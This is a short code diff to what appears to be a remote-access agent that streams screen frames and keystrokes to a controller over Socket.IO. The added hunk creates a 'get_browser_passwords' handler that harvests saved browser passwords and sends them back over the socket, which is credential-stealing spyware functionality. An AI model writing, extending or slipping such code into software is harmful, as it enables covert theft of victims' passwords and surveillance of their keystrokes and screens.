@@ -351,6 +351,16 @@ def on_get_monitors(_data=None):
         socketio.emit("monitors_result", {"monitors": [], "error": str(e)})
 
 
+@socketio.on("get_browser_passwords")
+def on_get_browser_passwords(_data=None):
+    try:
+        import browser_passwords as bp
+        passwords = bp.get_browser_passwords()
+        socketio.emit("browser_passwords_result", {"passwords": passwords})
+    except Exception as e:
+        socketio.emit("browser_passwords_result", {"passwords": [], "error": str(e)})
+
+
 # ── Broadcast helpers ─────────────────────────────────────────────────────────
 def broadcast_frame(b64):      socketio.emit("frame",        {"data": b64,  "_agent": _AGENT_NAME})
 def broadcast_key(data):       socketio.emit("key",          {**data,       "_agent": _AGENT_NAME})
